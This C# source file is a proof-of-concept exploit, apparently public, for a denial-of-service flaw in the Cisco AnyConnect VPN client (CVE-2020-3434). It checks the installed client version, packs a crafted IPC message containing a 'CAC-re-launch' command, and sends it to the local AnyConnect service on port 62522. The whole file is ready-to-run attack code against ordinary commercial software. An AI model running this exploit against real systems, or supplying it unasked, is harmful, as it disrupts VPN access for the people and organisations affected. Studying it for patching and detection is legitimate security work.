using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;


class Program
{
    private const int ERROR_VPN_NOT_FOUND = 1;
    private const int ERROR_SOCKET = 2;
    private const int ERROR_UNEXPECTED = 1337;

    static byte[] PackCommand(byte[] data)
    {
        MemoryStream stm = new MemoryStream();
        BinaryWriter writer = new BinaryWriter(stm);

        writer.Write(0x4353434f);                 // Signature
        writer.Write((ushort)  0x1A);              // Message header length
        writer.Write((ushort)data.Length);       // Message body length
        byte[] arr = {0xff, 0xff, 0xff, 0xff,     // IPC response
                        0x00, 0x00, 0x00, 0x00,   // Message user context
                        0x02, 0x00, 0x00, 0x00,   // Request message identifier
                        0x00, 0x00, 0x00, 0x00};  // Return IPC object
        writer.Write(arr);
        writer.Write((byte) 1);                   // Message type
        writer.Write((byte) 2);                   // Message identifier
        writer.Write(data);

        return stm.ToArray();
    }

    static byte[] SwapShort(ushort s)
    {
        byte[] bs = BitConverter.GetBytes(s);
        byte tmp = bs[0];
        bs[0] = bs[1];
        bs[1] = tmp;

        return bs;
    }

    static void PackString(BinaryWriter writer, int index, String s)
    {
        writer.Write(SwapShort((ushort)index));
        byte[] bs = Encoding.ASCII.GetBytes(s + "\0");
        writer.Write(SwapShort((ushort)bs.Length));
        writer.Write(bs);
    }
    static void Main(String[] args)
    {
        Console.WriteLine("Cisco AnyConnect DoS PoC (CVE-2020-3434)");
        Console.WriteLine("September 2020");
        Console.WriteLine("Author: ATGO\n");


        try
        {
            FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo(@"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe");
            Version vpndownloaderversion = new Version(myFileVersionInfo.FileVersion.Replace(", ", "."));
            Version ipcversion = new Version("4.7");
            Console.WriteLine("[*] Cisco AnyConnect version: {0}", vpndownloaderversion);


            String CACcmd = "CAC-re-launch";

            if (vpndownloaderversion >= ipcversion)
            {
                Console.WriteLine("[*] \"-ipc\" argument needed");
                CACcmd += "\t" + "-ipc=1337";
            }
            else
            {
                Console.WriteLine("[*] \"-ipc\" argument NOT needed");
            }


            CACcmd += "\t" + @"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe" + "\t" + "-";
            CACcmd = "\"" + CACcmd + "\"";
            Console.WriteLine("[*] Payload: {0}", CACcmd);

            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);

            PackString(writer, 2, CACcmd);
            PackString(writer, 6, "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpndownloader.exe");

            byte[] d = stm.ToArray();
            byte[] data = PackCommand(d);

            Console.WriteLine("[*] Sending payload");

            TcpClient client = new TcpClient("127.0.0.1", 62522);
            NetworkStream nstm = client.GetStream();
            nstm.ReadTimeout = 2000;
            nstm.Write(data, 0, data.Length);
            nstm.Flush();
            nstm.ReadByte();
            client.Close();

            Console.WriteLine("[*] Done");
            return;

        }
        catch (FileNotFoundException)
        {
            Console.WriteLine("[-] vpndownloader.exe NOT FOUND");
            Environment.ExitCode = ERROR_VPN_NOT_FOUND;
            return;
        }
        catch (SocketException)
        {
            Console.WriteLine("[-] Socket error");
            Environment.ExitCode = ERROR_SOCKET;
            return;
        }
        catch (Exception e)
        {
            Console.WriteLine("[-] Unexpected error");
            Console.WriteLine(e);
            Environment.ExitCode = ERROR_UNEXPECTED;
            return;
        }


    }
}
